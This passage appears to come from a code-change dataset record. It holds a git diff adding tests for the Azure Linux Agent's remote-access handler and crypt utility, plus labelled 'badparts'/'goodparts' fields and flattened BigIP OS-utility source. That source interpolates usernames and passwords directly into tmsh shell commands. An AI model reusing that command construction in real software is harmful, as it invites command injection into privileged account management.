tests.tools import *\n+\n+\n+info_messages = []\n+error_messages = []\n+\n+\n+def get_user_dictionary(users):\n+    user_dictionary = {}\n+    for user in users:\n+        user_dictionary[user[0]] = user\n+    return user_dictionary\n+\n+\n+def log_info(msg_format, *args):\n+    info_messages.append(msg_format.format(args))\n+\n+\n+def log_error(msg_format, *args):\n+    error_messages.append(msg_format.format(args))\n+\n+\n+class TestRemoteAccessHandler(AgentTestCase):\n+\n+    def setUp(self):\n+        super(TestRemoteAccessHandler, self).setUp()\n+        del info_messages[:]\n+        del error_messages[:]\n+\n+    # add_user tests\n+    @patch('azurelinuxagent.common.logger.Logger.info', side_effect=log_info)\n+    @patch('azurelinuxagent.common.logger.Logger.error', side_effect=log_error)\n+    @patch('azurelinuxagent.common.utils.cryptutil.CryptUtil.decrypt_secret', return_value=\"]aPPEv}uNg1FPnl?\")\n+    def test_add_user(self, _1, _2, _3):\n+        rah = RemoteAccessHandler()\n+        rah.os_util = MockOSUtil()\n+        tstpassword = \"]aPPEv}uNg1FPnl?\"\n+        tstuser = \"foobar\"\n+        expiration_date = datetime.utcnow() + timedelta(days=1)\n+        pwd = tstpassword\n+        rah.add_user(tstuser, pwd, expiration_date)\n+        users = get_user_dictionary(rah.os_util.get_users())\n+        self.assertTrue(tstuser in users, \"{0} missing from users\".format(tstuser))\n+        actual_user = users[tstuser]\n+        expected_expiration = (expiration_date + timedelta(days=1)).strftime(\"%Y-%m-%d\")\n+        self.assertEqual(actual_user[7], expected_expiration)\n+        self.assertEqual(actual_user[4], \"JIT_Account\")\n+        self.assertEqual(0, len(error_messages))\n+        self.assertEqual(1, len(info_messages))\n+        self.assertEqual(info_messages[0], \"User '{0}' added successfully with expiration in {1}\"\n+                         .format(tstuser, expected_expiration))\n+\n+    @patch('azurelinuxagent.common.logger.Logger.info', side_effect=log_info)\n+    @patch('azurelinuxagent.common.logger.Logger.error', side_effect=log_error)\n+    @patch('azurelinuxagent.common.utils.cryptutil.CryptUtil.decrypt_secret', return_value=\"]aPPEv}uNg1FPnl?\")\n+    def test_add_user_bad_creation_data(self, _1, _2, _3):\n+        rah = RemoteAccessHandler()\n+        rah.os_util = MockOSUtil()\n+        tstpassword = \"]aPPEv}uNg1FPnl?\"\n+        tstuser = \"\"\n+        expiration_date = datetime.utcnow() + timedelta(days=1)\n+        pwd = tstpassword\n+        rah.add_user(tstuser, pwd, expiration_date)\n+        self.assertEqual(0, len(rah.os_util.get_users()))\n+        self.assertEqual(1, len(error_messages))\n+        self.assertEqual(0, len(info_messages))\n+        error = \"Error adding user {0}. test exception for bad username\".format(tstuser)\n+        self.assertEqual(error, error_messages[0])\n+\n+    @patch('azurelinuxagent.common.logger.Logger.info', side_effect=log_info)\n+    @patch('azurelinuxagent.common.logger.Logger.error', side_effect=log_error)\n+    @patch('azurelinuxagent.common.utils.cryptutil.CryptUtil.decrypt_secret', return_value=\"\")\n+    def test_add_user_bad_password_data(self, _1, _2, _3):\n+        rah = RemoteAccessHandler()\n+        rah.os_util = MockOSUtil()\n+        tstpassword = \"\"\n+        tstuser = \"foobar\"\n+        expiration_date = datetime.utcnow() + timedelta(days=1)\n+        pwd = tstpassword\n+        rah.add_user(tstuser, pwd, expiration_date)\n+        self.assertEqual(0, len(rah.os_util.get_users()))\n+        self.assertEqual(1, len(error_messages))\n+        self.assertEqual(1, len(info_messages))\n+        error = \"Error creating user {0}. test exception for bad password\".format(tstuser)\n+        self.assertEqual(error, error_messages[0])\n+        self.assertEqual(\"User deleted {0}\".format(tstuser), info_messages[0])\n+\n+    @patch('azurelinuxagent.common.utils.cryptutil.CryptUtil.decrypt_secret',\n+           return_value=\"]aPPEv}uNg1FPnl?\")\n+    def test_add_user_already_existing(self, _):\n+        rah = RemoteAccessHandler()\n+        rah.os_util = MockOSUtil()\n+        tstpassword = \"]aPPEv}uNg1FPnl?\"\n+        tstuser = \"foobar\"\n+        expiration_date = datetime.utcnow() + timedelta(days=1)\n+        pwd = tstpassword\n+        rah.add_user(tstuser, pwd, expiration_date)\n+        users = get_user_dictionary(rah.os_util.get_users())\n+        self.assertTrue(tstuser in users, \"{0} missing from users\".format(tstuser))\n+        self.assertEqual(1, len(users.keys()))\n+        actual_user = users[tstuser]\n+        self.assertEqual(actual_user[7], (expiration_date + timedelta(days=1)).strftime(\"%Y-%m-%d\"))\n+        # add the new duplicate user, ensure it's not created and does not overwrite the existing user.\n+        # this does not test the user add function as that's mocked, it tests processing skips the remaining\n+        # calls after the initial failure\n+        new_user_expiration = datetime.utcnow() + timedelta(days=5)\n+        rah.add_user(tstuser, pwd, new_user_expiration)\n+        # refresh users\n+        users = get_user_dictionary(rah.os_util.get_users())\n+        self.assertTrue(tstuser in users, \"{0} missing from users after dup user attempted\".format(tstuser))\n+        self.assertEqual(1, len(users.keys()))\n+        actual_user = users[tstuser]\n+        self.assertEqual(actual_user[7], (expiration_date + timedelta(days=1)).strftime(\"%Y-%m-%d\"))\n+\n+    # delete_user tests\n+    @patch('azurelinuxagent.common.logger.Logger.info', side_effect=log_info)\n+    @patch('azurelinuxagent.common.logger.Logger.error', side_effect=log_error)\n+    @patch('azurelinuxagent.common.utils.cryptutil.CryptUtil.decrypt_secret', return_value=\"]aPPEv}uNg1FPnl?\")\n+    def test_delete_user(self, _1, _2, _3):\n+        rah = RemoteAccessHandler()\n+        rah.os_util = MockOSUtil()\n+        tstpassword = \"]aPPEv}uNg1FPnl?\"\n+        tstuser = \"foobar\"\n+        expiration_date = datetime.utcnow() + timedelta(days=1)\n+        expected_expiration = (expiration_date + timedelta(days=1)).strftime(\"%Y-%m-%d\")\n+        pwd = tstpassword\n+        rah.add_user(tstuser, pwd, expiration_date)\n+        users = get_user_dictionary(rah.os_util.get_users())\n+        self.assertTrue(tstuser in users, \"{0} missing from users\".format(tstuser))\n+        rah.delete_user(tstuser)\n+        # refresh users\n+        users = get_user_dictionary(rah.os_util.get_users())\n+        self.assertFalse(tstuser in users)\n+        self.assertEqual(0, len(error_messages))\n+        self.assertEqual(2, len(info_messages))\n+        self.assertEqual(\"User '{0}' added successfully with expiration in {1}\".format(tstuser, expected_expiration),\n+                         info_messages[0])\n+        self.assertEqual(\"User deleted {0}\".format(tstuser), info_messages[1])\n+\n+    def test_handle_failed_create_with_bad_data(self):\n+        mock_os_util = MockOSUtil()\n+        testusr = \"foobar\"\n+        mock_os_util.all_users[testusr] = (testusr, None, None, None, None, None, None, None)\n+        rah = RemoteAccessHandler()\n+        rah.os_util = mock_os_util\n+        rah.handle_failed_create(\"\", \"test message\")\n+        users = get_user_dictionary(rah.os_util.get_users())\n+        self.assertEqual(1, len(users.keys()))\n+        self.assertTrue(testusr in users, \"Expected user {0} missing\".format(testusr))\n+\n+    @patch('azurelinuxagent.common.logger.Logger.info', side_effect=log_info)\n+    @patch('azurelinuxagent.common.logger.Logger.error', side_effect=log_error)\n+    def test_delete_user_does_not_exist(self, _1, _2):\n+        mock_os_util = MockOSUtil()\n+        testusr = \"foobar\"\n+        mock_os_util.all_users[testusr] = (testusr, None, None, None, None, None, None, None)\n+        rah = RemoteAccessHandler()\n+        rah.os_util = mock_os_util\n+        testuser = \"Carl\"\n+        test_message = \"test message\"\n+        rah.handle_failed_create(testuser, test_message)\n+        users = get_user_dictionary(rah.os_util.get_users())\n+        self.assertEqual(1, len(users.keys()))\n+        self.assertTrue(testusr in users, \"Expected user {0} missing\".format(testusr))\n+        self.assertEqual(2, len(error_messages))\n+        self.assertEqual(0, len(info_messages))\n+        self.assertEqual(\"Error creating user {0}. {1}\".format(testuser, test_message), error_messages[0])\n+        msg = \"Failed to clean up after account creation for {0}. test exception, user does not exist to delete\"\\\n+            .format(testuser)\n+        self.assertEqual(msg, error_messages[1])\n+\n+    @patch('azurelinuxagent.common.utils.cryptutil.CryptUtil.decrypt_secret',\n+           return_value=\"]aPPEv}uNg1FPnl?\")\n+    def test_handle_new_user(self, _):\n+        rah = RemoteAccessHandler()\n+        rah.os_util = MockOSUtil()\n+        data_str = load_data('wire/remote_access_single_account.xml')\n+        remote_access = RemoteAccess(data_str)\n+        tstuser = remote_access.user_list.users[0].name\n+        expiration_date = datetime.utcnow() + timedelta(days=1)\n+        expiration = expiration_date.strftime(\"%a, %d %b %Y %H:%M:%S \") + \"UTC\"\n+        remote_access.user_list.users[0].expiration = expiration\n+        rah.remote_access = remote_access\n+        rah.handle_remote_access()\n+        users = get_user_dictionary(rah.os_util.get_users())\n+        self.assertTrue(tstuser in users, \"{0} missing from users\".format(tstuser))\n+        actual_user = users[tstuser]\n+        expected_expiration = (expiration_date + timedelta(days=1)).strftime(\"%Y-%m-%d\")\n+        self.assertEqual(actual_user[7], expected_expiration)\n+        self.assertEqual(actual_user[4], \"JIT_Account\")\n+\n+    def test_do_not_add_expired_user(self):\n+        rah = RemoteAccessHandler()\n+        rah.os_util = MockOSUtil()      \n+        data_str = load_data('wire/remote_access_single_account.xml')\n+        remote_access = RemoteAccess(data_str)\n+        expiration = (datetime.utcnow() - timedelta(days=2)).strftime(\"%a, %d %b %Y %H:%M:%S \") + \"UTC\"\n+        remote_access.user_list.users[0].expiration = expiration\n+        rah.remote_access = remote_access\n+        rah.handle_remote_access()\n+        users = get_user_dictionary(rah.os_util.get_users())\n+        self.assertFalse(\"testAccount\" in users)\n+\n+    @patch('azurelinuxagent.common.logger.Logger.info', side_effect=log_info)\n+    @patch('azurelinuxagent.common.logger.Logger.error', side_effect=log_error)\n+    def test_error_add_user(self, _1, _2):\n+        rah = RemoteAccessHandler()\n+        rah.os_util = MockOSUtil()\n+        tstuser = \"foobar\"\n+        expiration = datetime.utcnow() + timedelta(days=1)\n+        pwd = \"bad password\"\n+        rah.add_user(tstuser, pwd, expiration)\n+        users = get_user_dictionary(rah.os_util.get_users())\n+        self.assertEqual(0, len(users))\n+        self.assertEqual(1, len(error_messages))\n+        self.assertEqual(1, len(info_messages))\n+        error = \"Error creating user {0}. [CryptError] Error decoding secret\\nInner error: Incorrect padding\".\\\n+            format(tstuser)\n+        self.assertEqual(error, error_messages[0])\n+        self.assertEqual(\"User deleted {0}\".format(tstuser), info_messages[0])\n+\n+    def test_handle_remote_access_no_users(self):\n+        rah = RemoteAccessHandler()\n+        rah.os_util = MockOSUtil()\n+        data_str = load_data('wire/remote_access_no_accounts.xml')\n+        remote_access = RemoteAccess(data_str)\n+        rah.remote_access = remote_access\n+        rah.handle_remote_access()\n+        users = get_user_dictionary(rah.os_util.get_users())\n+        self.assertEqual(0, len(users.keys()))\n+\n+    def test_handle_remote_access_validate_jit_user_valid(self):\n+        rah = RemoteAccessHandler()\n+        comment = \"JIT_Account\"\n+        result = rah.validate_jit_user(comment)\n+        self.assertTrue(result, \"Did not identify '{0}' as a JIT_Account\".format(comment))\n+\n+    def test_handle_remote_access_validate_jit_user_invalid(self):\n+        rah = RemoteAccessHandler()\n+        test_users = [\"John Doe\", None, \"\", \" \"]\n+        failed_results = \"\"\n+        for user in test_users:\n+            if rah.validate_jit_user(user):\n+                failed_results += \"incorrectly identified '{0} as a JIT_Account'.  \".format(user)\n+        if len(failed_results) > 0:\n+            self.fail(failed_results)\n+\n+    @patch('azurelinuxagent.common.utils.cryptutil.CryptUtil.decrypt_secret',\n+           return_value=\"]aPPEv}uNg1FPnl?\")\n+    def test_handle_remote_access_multiple_users(self, _):\n+        rah = RemoteAccessHandler()\n+        rah.os_util = MockOSUtil()\n+        data_str = load_data('wire/remote_access_two_accounts.xml')\n+        remote_access = RemoteAccess(data_str)\n+        testusers = []\n+        count = 0\n+        while count < 2:\n+            user = remote_access.user_list.users[count].name\n+            expiration_date = datetime.utcnow() + timedelta(days=count + 1)\n+            expiration = expiration_date.strftime(\"%a, %d %b %Y %H:%M:%S \") + \"UTC\"\n+            remote_access.user_list.users[count].expiration = expiration\n+            testusers.append(user)\n+            count += 1\n+        rah.remote_access = remote_access\n+        rah.handle_remote_access()\n+        users = get_user_dictionary(rah.os_util.get_users())\n+        self.assertTrue(testusers[0] in users, \"{0} missing from users\".format(testusers[0]))\n+        self.assertTrue(testusers[1] in users, \"{0} missing from users\".format(testusers[1]))\n+\n+    @patch('azurelinuxagent.common.utils.cryptutil.CryptUtil.decrypt_secret',\n+           return_value=\"]aPPEv}uNg1FPnl?\")\n+    # max fabric supports in the Goal State\n+    def test_handle_remote_access_ten_users(self, _):\n+        rah = RemoteAccessHandler()\n+        rah.os_util = MockOSUtil()\n+        data_str = load_data('wire/remote_access_10_accounts.xml')\n+        remote_access = RemoteAccess(data_str)\n+        count = 0\n+        for user in remote_access.user_list.users:\n+            count += 1\n+            user.name = \"tstuser{0}\".format(count)\n+            expiration_date = datetime.utcnow() + timedelta(days=count)\n+            user.expiration = expiration_date.strftime(\"%a, %d %b %Y %H:%M:%S \") + \"UTC\"\n+        rah.remote_access = remote_access\n+        rah.handle_remote_access()\n+        users = get_user_dictionary(rah.os_util.get_users())\n+        self.assertEqual(10, len(users.keys()))\n+\n+    @patch('azurelinuxagent.common.utils.cryptutil.CryptUtil.decrypt_secret',\n+           return_value=\"]aPPEv}uNg1FPnl?\")\n+    def test_handle_remote_access_user_removed(self, _):\n+        rah = RemoteAccessHandler()\n+        rah.os_util = MockOSUtil()\n+        data_str = load_data('wire/remote_access_10_accounts.xml')\n+        remote_access = RemoteAccess(data_str)\n+        count = 0\n+        for user in remote_access.user_list.users:\n+            count += 1\n+            user.name = \"tstuser{0}\".format(count)\n+            expiration_date = datetime.utcnow() + timedelta(days=count)\n+            user.expiration = expiration_date.strftime(\"%a, %d %b %Y %H:%M:%S \") + \"UTC\"\n+        rah.remote_access = remote_access\n+        rah.handle_remote_access()\n+        users = get_user_dictionary(rah.os_util.get_users())\n+        self.assertEqual(10, len(users.keys()))\n+        del rah.remote_access.user_list.users[:]\n+        self.assertEqual(10, len(users.keys()))\n+\n+    @patch('azurelinuxagent.common.utils.cryptutil.CryptUtil.decrypt_secret',\n+           return_value=\"]aPPEv}uNg1FPnl?\")\n+    def test_handle_remote_access_bad_data_and_good_data(self, _):\n+        rah = RemoteAccessHandler()\n+        rah.os_util = MockOSUtil()\n+        data_str = load_data('wire/remote_access_10_accounts.xml')\n+        remote_access = RemoteAccess(data_str)\n+        count = 0\n+        for user in remote_access.user_list.users:\n+            count += 1\n+            user.name = \"tstuser{0}\".format(count)\n+            if count is 2:\n+                user.name = \"\"\n+            expiration_date = datetime.utcnow() + timedelta(days=count)\n+            user.expiration = expiration_date.strftime(\"%a, %d %b %Y %H:%M:%S \") + \"UTC\"\n+        rah.remote_access = remote_access\n+        rah.handle_remote_access()\n+        users = get_user_dictionary(rah.os_util.get_users())\n+        self.assertEqual(9, len(users.keys()))\n+\n+    @patch('azurelinuxagent.common.utils.cryptutil.CryptUtil.decrypt_secret',\n+           return_value=\"]aPPEv}uNg1FPnl?\")\n+    def test_handle_remote_access_deleted_user_readded(self, _):\n+        rah = RemoteAccessHandler()\n+        rah.os_util = MockOSUtil()\n+        data_str = load_data('wire/remote_access_single_account.xml')\n+        remote_access = RemoteAccess(data_str)\n+        tstuser = remote_access.user_list.users[0].name\n+        expiration_date = datetime.utcnow() + timedelta(days=1)\n+        expiration = expiration_date.strftime(\"%a, %d %b %Y %H:%M:%S \") + \"UTC\"\n+        remote_access.user_list.users[0].expiration = expiration\n+        rah.remote_access = remote_access\n+        rah.handle_remote_access()\n+        users = get_user_dictionary(rah.os_util.get_users())\n+        self.assertTrue(tstuser in users, \"{0} missing from users\".format(tstuser))\n+        os_util = rah.os_util\n+        os_util.__class__ = MockOSUtil\n+        os_util.all_users.clear()\n+        # refresh users\n+        users = get_user_dictionary(rah.os_util.get_users())\n+        self.assertTrue(tstuser not in users)\n+        rah.handle_remote_access()\n+        # refresh users\n+        users = get_user_dictionary(rah.os_util.get_users())\n+        self.assertTrue(tstuser in users, \"{0} missing from users\".format(tstuser))\n+\n+    @patch('azurelinuxagent.common.utils.cryptutil.CryptUtil.decrypt_secret',\n+           return_value=\"]aPPEv}uNg1FPnl?\")\n+    @patch('azurelinuxagent.common.osutil.get_osutil',\n+           return_value=MockOSUtil())\n+    @patch('azurelinuxagent.common.protocol.util.ProtocolUtil.get_protocol',\n+           return_value=WireProtocol(\"12.34.56.78\"))\n+    @patch('azurelinuxagent.common.protocol.wire.WireProtocol.get_incarnation',\n+           return_value=\"1\")\n+    @patch('azurelinuxagent.common.protocol.wire.WireClient.get_remote_access',\n+           return_value=\"asdf\")\n+    def test_remote_access_handler_run_bad_data(self, _1, _2, _3, _4, _5):\n+        rah = RemoteAccessHandler()\n+        rah.os_util = MockOSUtil()\n+        tstpassword = \"]aPPEv}uNg1FPnl?\"\n+        tstuser = \"foobar\"\n+        expiration_date = datetime.utcnow() + timedelta(days=1)\n+        pwd = tstpassword\n+        rah.add_user(tstuser, pwd, expiration_date)\n+        users = get_user_dictionary(rah.os_util.get_users())\n+        self.assertTrue(tstuser in users, \"{0} missing from users\".format(tstuser))\n+        rah.run()\n+        self.assertTrue(tstuser in users, \"{0} missing from users\".format(tstuser))\ndiff --git a/tests/ga/test_update.py b/tests/ga/test_update.py\nindex d53bd8806..a3aa7ae95 100644\n--- a/tests/ga/test_update.py\n+++ b/tests/ga/test_update.py\n@@ -1213,22 +1213,25 @@ def iterator(*args, **kwargs):\n         fileutil.write_file(conf.get_agent_pid_file_path(), ustr(42))\n \n         with patch('azurelinuxagent.ga.exthandlers.get_exthandlers_handler') as mock_handler:\n-            with patch('azurelinuxagent.ga.monitor.get_monitor_handler') as mock_monitor:\n-                with patch('azurelinuxagent.ga.env.get_env_handler') as mock_env:\n-                    with patch('time.sleep', side_effect=iterator) as mock_sleep:\n-                        with patch('sys.exit') as mock_exit:\n-                            if isinstance(os.getppid, MagicMock):\n-                                self.update_handler.run()\n-                            else:\n-                                with patch('os.getppid', return_value=42):\n+            with patch('azurelinuxagent.ga.remoteaccess.get_remote_access_handler') as mock_ra_handler:\n+                with patch('azurelinuxagent.ga.monitor.get_monitor_handler') as mock_monitor:\n+                    with patch('azurelinuxagent.ga.env.get_env_handler') as mock_env:\n+                        with patch('time.sleep', side_effect=iterator) as mock_sleep:\n+                            with patch('sys.exit') as mock_exit:\n+                                if isinstance(os.getppid, MagicMock):\n                                     self.update_handler.run()\n-\n-                            self.assertEqual(1, mock_handler.call_count)\n-                            self.assertEqual(mock_handler.return_value.method_calls, calls)\n-                            self.assertEqual(invocations, mock_sleep.call_count)\n-                            self.assertEqual(1, mock_monitor.call_count)\n-                            self.assertEqual(1, mock_env.call_count)\n-                            self.assertEqual(1, mock_exit.call_count)\n+                                else:\n+                                    with patch('os.getppid', return_value=42):\n+                                        self.update_handler.run()\n+\n+                                self.assertEqual(1, mock_handler.call_count)\n+                                self.assertEqual(mock_handler.return_value.method_calls, calls)\n+                                self.assertEqual(1, mock_ra_handler.call_count)\n+                                self.assertEqual(mock_ra_handler.return_value.method_calls, calls)\n+                                self.assertEqual(invocations, mock_sleep.call_count)\n+                                self.assertEqual(1, mock_monitor.call_count)\n+                                self.assertEqual(1, mock_env.call_count)\n+                                self.assertEqual(1, mock_exit.call_count)\n \n     def test_run(self):\n         self._test_run()\n@@ -1497,9 +1500,10 @@ def iterator(*args, **kwargs):\n             with patch.object(UpdateHandler, '_is_orphaned') as mock_is_orphaned:\n                 mock_is_orphaned.__get__ = Mock(return_value=False)\n                 with patch('azurelinuxagent.ga.exthandlers.get_exthandlers_handler') as mock_handler:\n-                    with patch('time.sleep', side_effect=iterator) as mock_sleep:\n-                        with patch('sys.exit') as mock_exit:\n-                            self.update_handler.run()\n+                    with patch('azurelinuxagent.ga.remoteaccess.get_remote_access_handler') as mock_ra_handler:\n+                        with patch('time.sleep', side_effect=iterator) as mock_sleep:\n+                            with patch('sys.exit') as mock_exit:\n+                                self.update_handler.run()\n \n     @patch('azurelinuxagent.ga.monitor.get_monitor_handler')\n     @patch('azurelinuxagent.ga.env.get_env_handler')\ndiff --git a/tests/test_import.py b/tests/test_import.py\nindex c5fd31c06..c792c241e 100644\n--- a/tests/test_import.py\n+++ b/tests/test_import.py\n@@ -9,6 +9,7 @@\n import azurelinuxagent.daemon.scvmm as scvmm\n import azurelinuxagent.ga.exthandlers as exthandlers\n import azurelinuxagent.ga.monitor as monitor\n+import azurelinuxagent.ga.remoteaccess as remoteaccess\n import azurelinuxagent.ga.update as update\n \n \n@@ -25,3 +26,4 @@ def test_get_handler(self):\n         monitor.get_monitor_handler()\n         update.get_update_handler()\n         exthandlers.get_exthandlers_handler()\n+        remoteaccess.get_remote_access_handler()\ndiff --git a/tests/utils/test_crypt_util.py b/tests/utils/test_crypt_util.py\nnew file mode 100644\nindex 000000000..c765363d3\n--- /dev/null\n+++ b/tests/utils/test_crypt_util.py\n@@ -0,0 +1,71 @@\n+# Copyright 2018 Microsoft Corporation\n+#\n+# Licensed under the Apache License, Version 2.0 (the \"License\");\n+# you may not use this file except in compliance with the License.\n+# You may obtain a copy of the License at\n+#\n+#     http://www.apache.org/licenses/LICENSE-2.0\n+#\n+# Unless required by applicable law or agreed to in writing, software\n+# distributed under the License is distributed on an \"AS IS\" BASIS,\n+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+# See the License for the specific language governing permissions and\n+# limitations under the License.\n+#\n+# Requires Python 2.6+ and Openssl 1.0+\n+#\n+\n+import base64\n+import binascii\n+import errno as errno\n+import glob\n+import random\n+import string\n+import subprocess\n+import tempfile\n+import uuid\n+\n+import azurelinuxagent.common.conf as conf\n+import azurelinuxagent.common.utils.shellutil as shellutil\n+from azurelinuxagent.common.future import ustr\n+from azurelinuxagent.common.utils.cryptutil import CryptUtil\n+from azurelinuxagent.common.exception import CryptError\n+from azurelinuxagent.common.version import PY_VERSION_MAJOR\n+from tests.tools import *\n+from subprocess import CalledProcessError\n+\n+class TestCryptoUtilOperations(AgentTestCase):\n+    def test_decrypt_encrypted_text(self):\n+        encrypted_string = load_data(\"wire/encrypted.enc\")\n+        prv_key = os.path.join(self.tmp_dir, \"TransportPrivate.pem\") \n+        with open(prv_key, 'w+') as c:\n+            c.write(load_data(\"wire/sample.pem\"))\n+        secret = ']aPPEv}uNg1FPnl?'\n+        crypto = CryptUtil(conf.get_openssl_cmd())\n+        decrypted_string = crypto.decrypt_secret(encrypted_string, prv_key)\n+        self.assertEquals(secret, decrypted_string, \"decrypted string does not match expected\")\n+\n+    def test_decrypt_encrypted_text_missing_private_key(self):\n+        encrypted_string = load_data(\"wire/encrypted.enc\")\n+        prv_key = os.path.join(self.tmp_dir, \"TransportPrivate.pem\")\n+        crypto = CryptUtil(conf.get_openssl_cmd())\n+        self.assertRaises(CalledProcessError, crypto.decrypt_secret, encrypted_string, \"abc\" + prv_key)\n+    \n+    def test_decrypt_encrypted_text_wrong_private_key(self):\n+        encrypted_string = load_data(\"wire/encrypted.enc\")\n+        prv_key = os.path.join(self.tmp_dir, \"wrong.pem\")\n+        with open(prv_key, 'w+') as c:\n+            c.write(load_data(\"wire/trans_prv\"))\n+        crypto = CryptUtil(conf.get_openssl_cmd())\n+        self.assertRaises(CalledProcessError, crypto.decrypt_secret, encrypted_string, prv_key)\n+\n+    def test_decrypt_encrypted_text_text_not_encrypted(self):\n+        encrypted_string = \"abc@123\"\n+        prv_key = os.path.join(self.tmp_dir, \"TransportPrivate.pem\") \n+        with open(prv_key, 'w+') as c:\n+            c.write(load_data(\"wire/sample.pem\"))\n+        crypto = CryptUtil(conf.get_openssl_cmd())\n+        self.assertRaises(CryptError, crypto.decrypt_secret, encrypted_string, prv_key)\n+\n+if __name__ == '__main__':\n+    unittest.main()\n", "files": {"/azurelinuxagent/common/osutil/bigip.py": {"changes": [{"diff": "\n         \"\"\"\n         return None\n \n-    def useradd(self, username, expiration=None):\n+    def useradd(self, username, expiration=None, comment=None):\n         \"\"\"Create user account using tmsh\n \n         Our policy is to create two accounts when booting a BIG-IP instance.\n", "add": 1, "remove": 1, "filename": "/azurelinuxagent/common/osutil/bigip.py", "badparts": ["    def useradd(self, username, expiration=None):"], "goodparts": ["    def useradd(self, username, expiration=None, comment=None):"]}], "source": "\n import array import fcntl import os import platform import re import socket import struct import time try: import azurelinuxagent.common.logger as logger import azurelinuxagent.common.utils.shellutil as shellutil from azurelinuxagent.common.exception import OSUtilError from azurelinuxagent.common.osutil.default import DefaultOSUtil except ImportError: import azurelinuxagent.logger as logger import azurelinuxagent.utils.shellutil as shellutil from azurelinuxagent.exception import OSUtilError from azurelinuxagent.distro.default.osutil import DefaultOSUtil class BigIpOSUtil(DefaultOSUtil): def __init__(self): super(BigIpOSUtil, self).__init__() def _wait_until_mcpd_is_initialized(self): \"\"\"Wait for mcpd to become available All configuration happens in mcpd so we need to wait that this is available before we go provisioning the system. I call this method at the first opportunity I have(during the DVD mounting call). This ensures that the rest of the provisioning does not need to wait for mcpd to be available unless it absolutely wants to. :return bool: Returns True upon success :raises OSUtilError: Raises exception if mcpd does not come up within roughly 50 minutes(100 * 30 seconds) \"\"\" for retries in range(1, 100): logger.info(\"Checking to see if mcpd is up\") rc=shellutil.run(\"/usr/bin/tmsh -a show sys mcp-state field-fmt 2>/dev/null | grep phase | grep running\", chk_err=False) if rc==0: logger.info(\"mcpd is up!\") break time.sleep(30) if rc is 0: return True raise OSUtilError( \"mcpd hasn't completed initialization! Cannot proceed!\" ) def _save_sys_config(self): cmd=\"/usr/bin/tmsh save sys config\" rc=shellutil.run(cmd) if rc !=0: logger.error(\"WARNING: Cannot save sys config on 1st boot.\") return rc def restart_ssh_service(self): return shellutil.run(\"/usr/bin/bigstart restart sshd\", chk_err=False) def stop_agent_service(self): return shellutil.run(\"/sbin/service waagent stop\", chk_err=False) def start_agent_service(self): return shellutil.run(\"/sbin/service waagent start\", chk_err=False) def register_agent_service(self): return shellutil.run(\"/sbin/chkconfig --add waagent\", chk_err=False) def unregister_agent_service(self): return shellutil.run(\"/sbin/chkconfig --del waagent\", chk_err=False) def get_dhcp_pid(self): ret=shellutil.run_get_output(\"/sbin/pidof dhclient\") return ret[1] if ret[0]==0 else None def set_hostname(self, hostname): \"\"\"Set the static hostname of the device Normally, tmsh is used to set the hostname for the system. For our purposes at this time though, I would hesitate to trust this function. Azure(Stack) uses the name that you provide in the Web UI or ARM(for example) as the value of the hostname argument to this method. The problem is that there is nowhere in the UI that specifies the restrictions and checks that tmsh has for the hostname. For example, if you set the name \"bigip1\" in the Web UI, Azure(Stack) considers that a perfectly valid name. When WAAgent gets around to running though, tmsh will reject that value because it is not a fully qualified domain name. The proper value should have been bigip.xxx.yyy WAAgent will not fail if this command fails, but the hostname will not be what the user set either. Currently we do not set the hostname when WAAgent starts up, so I am passing on setting it here too. :param hostname: The hostname to set on the device \"\"\" return None def set_dhcp_hostname(self, hostname): \"\"\"Sets the DHCP hostname See `set_hostname` for an explanation of why I pass here :param hostname: The hostname to set on the device \"\"\" return None def useradd(self, username, expiration=None): \"\"\"Create user account using tmsh Our policy is to create two accounts when booting a BIG-IP instance. The first account is the one that the user specified when they did the instance creation. The second one is the admin account that is, or should be, built in to the system. :param username: The username that you want to add to the system :param expiration: The expiration date to use. We do not use this value. \"\"\" if self.get_userentry(username): logger.info(\"User{0} already exists, skip useradd\", username) return None cmd=\"/usr/bin/tmsh create auth user %s partition-access add{ all-partitions{ role admin}} shell bash\" %(username) retcode, out=shellutil.run_get_output(cmd, log_cmd=True, chk_err=True) if retcode !=0: raise OSUtilError( \"Failed to create user account:{0}, retcode:{1}, output:{2}\".format(username, retcode, out) ) self._save_sys_config() return retcode def chpasswd(self, username, password, crypt_id=6, salt_len=10): \"\"\"Change a user's password with tmsh Since we are creating the user specified account and additionally changing the password of the built-in 'admin' account, both must be modified in this method. Note that the default method also checks for a \"system level\" of the user; based on the value of UID_MIN in /etc/login.defs. In our env, all user accounts have the UID 0. So we can't rely on this value. :param username: The username whose password to change :param password: The unencrypted password to set for the user :param crypt_id: If encrypting the password, the crypt_id that was used :param salt_len: If encrypting the password, the length of the salt value used to do it. \"\"\" cmd=\"/usr/bin/tmsh modify auth user{0} password '{1}'\".format(username, password) ret, output=shellutil.run_get_output(cmd, log_cmd=False, chk_err=True) if ret !=0: raise OSUtilError( \"Failed to set password for{0}:{1}\".format(username, output) ) userentry=self.get_userentry('admin') if userentry is None: raise OSUtilError(\"The 'admin' user account was not found!\") cmd=\"/usr/bin/tmsh modify auth user 'admin' password '{0}'\".format(password) ret, output=shellutil.run_get_output(cmd, log_cmd=False, chk_err=True) if ret !=0: raise OSUtilError( \"Failed to set password for 'admin':{0}\".format(output) ) self._save_sys_config() return ret def del_account(self, username): \"\"\"Deletes a user account. Note that the default method also checks for a \"system level\" of the user; based on the value of UID_MIN in /etc/login.defs. In our env, all user accounts have the UID 0. So we can't rely on this value. We also don't use sudo, so we remove that method call as well. :param username: :return: \"\"\" shellutil.run(\"> /var/run/utmp\") shellutil.run(\"/usr/bin/tmsh delete auth user \" +username) def get_dvd_device(self, dev_dir='/dev'): \"\"\"Find BIG-IP's CD/DVD device This device is almost certainly /dev/cdrom so I added the ? to this pattern. Note that this method will return upon the first device found, but in my tests with 12.1.1 it will also find /dev/sr0 on occasion. This is NOT the correct CD/DVD device though. :todo: Consider just always returning \"/dev/cdrom\" here if that device device exists on all platforms that are supported on Azure(Stack) :param dev_dir: The root directory from which to look for devices \"\"\" patten=r'(sr[0-9]|hd[c-z]|cdrom[0-9]?)' for dvd in[re.match(patten, dev) for dev in os.listdir(dev_dir)]: if dvd is not None: return \"/dev/{0}\".format(dvd.group(0)) raise OSUtilError(\"Failed to get dvd device\") def mount_dvd(self, **kwargs): \"\"\"Mount the DVD containing the provisioningiso.iso file This is the _first_ hook that WAAgent provides for us, so this is the point where we should wait for mcpd to load. I am just overloading this method to add the mcpd wait. Then 